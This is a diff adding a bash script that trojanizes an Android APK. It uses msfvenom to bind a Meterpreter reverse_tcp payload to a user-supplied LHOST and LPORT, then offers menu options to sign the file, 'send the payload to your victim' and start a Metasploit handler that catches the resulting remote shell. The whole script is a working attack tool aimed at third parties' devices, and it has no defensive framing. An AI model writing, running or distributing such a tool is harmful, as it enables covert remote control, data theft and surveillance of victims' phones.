@@ -1,0 +1,83 @@
+#!/bin/bash
+PWD=$(pwd)
+printf "\e[1;31mEnter your input apk (path/name) ==> \e[0m"
+read inputapk
+printf "\n"
+printf "\e[1;31mEnter LHOST ==>\e[0m "
+read lht
+printf "\n"
+printf "\e[1;31mEnter LPORT ==>\e[0m "
+read lpt
+printf "\n"
+printf "\e[1;31mEnter your output payloadbinded apk (path/name) ==> \e[0m"
+read outputapk
+printf "\e[1;94mProcessing\e[0m"
+printf "\e[1;94m.\e[om"
+sleep 0.3
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m"
+sleep 0.3
+printf "\e[1;94m.\e[0m\n"
+sleep 0.3
+printf "\n"
+msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o $outputapk
+sleep 3
+printf "\e[1;34mIn order to make the output apk installable, sign with apk signer\e[0\n"
+printf "\e[1;33myou may download apk signer from playstore:- https://play.google.com/store/apps/details?id=com.haibison.apksigner \e[0m\n"
+sleep 3
+printf "\e[1;36mEnter the path to the directory in which your signed payload existing ==> \e[0m"
+read pathh
+printf "\n"
+printf "\e[1;36mEnter the signed payload name with (.apk) extension ==> \e[0m"
+read signpay
+printf "\n"
+sleep 2
+printf "\e[1;33m\e[104mChoose any from option:-\e[0m\n"
+echo
+while true; do
+printf "\e[1;32m01. Send the payload to your victim\e[om\n"
+printf "\e[1;32m02. Install payload in this device\e[0m\n"
+printf "\e[1;32m03. Start exploit\e[0m\n"
+printf "\e[1;32m04. Remove the apk\e[0m\n"
+printf "\e[1;32m>>Run 'quit' to exit\e[0m\n"
+echo
+printf "\e[1;36mEnter your option==> \e[1;32m"
+read option
+echo
+if [[ $option == 1 ]] || [[ $option == 01 ]]
+then
+cd $pathh && xdg-open --send $signpay
+cd $PWD
+elif [[ $option == 2 ]] || [[ $option == 02 ]]
+then
+cd $pathh && xdg-open $signpay
+cd $PWD
+elif [[ $option == 3 ]] || [[ $option == 03 ]]
+then
+mkdir -p $PREFIX/tmp
+cd $PREFIX/tmp
+echo "use exploit/multi/handler" > run
+echo "set payload android/meterpreter/reverse_tcp" >> run
+echo "set lhost $lht" >> run
+echo "set lport $lpt" >> run
+echo "show options" >> run
+echo "exploit" >> run
+msfconsole -r run
+cd - &> /dev/null
+cd $PWD
+elif [[ $option == 4 ]] || [[ $option == 04 ]]
+then
+cd $pathh && rm -rf $signpay
+cd $PWD
+elif [[ $option == quit ]]
+then
+unset PWD
+exit
+else
+printf "\e[1;31m>>>please choose a valid option\e[0m\n"
+fi
+done
+
